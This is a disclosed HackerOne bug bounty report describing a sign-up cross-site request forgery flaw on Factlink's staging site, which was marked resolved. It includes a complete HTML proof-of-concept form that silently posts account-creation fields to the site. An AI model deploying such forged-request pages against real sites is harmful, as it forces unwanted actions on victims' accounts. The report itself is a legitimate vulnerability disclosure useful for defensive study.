---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13583'
original_report_id: '13583'
title: Sign  up CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: factlink
created_at: '2014-05-27T09:27:44.944Z'
disclosed_at: '2014-06-05T11:04:34.578Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Sign  up CSRF

## Metadata

- HackerOne Report ID: 13583
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: factlink
- Disclosed At: 2014-06-05T11:04:34.578Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Any user can be forced to sign up and presented with a home dash board .
here is the csrf 

<html>
  <!-- CSRF PoC Chandrakant  -->
  <body>
    <form action="https://staging.factlink.com/users/sign_in_or_up/up" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="authenticity&#95;token" value="mDOtU6Iz1eYGyFYolgEMlTEcX0JGiO1Y1iCWbIb6qhY&#61;" />
      <input type="hidden" name="user&#95;new&#95;account&#91;full&#95;name&#93;" value="test" />
      <input type="hidden" name="user&#95;new&#95;account&#91;email&#93;" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="user&#95;new&#95;account&#91;password&#93;" value="chandra2123" />
      <input type="hidden" name="user&#95;new&#95;account&#91;password&#95;confirmation&#93;" value="chandra&#64;123" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Save this any name.html and then double clik you will be presented as home panel 
authentication token is there but that is not preventing csrf issue .

Remediation :
Use CSRF token .

Thanks
CKN

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
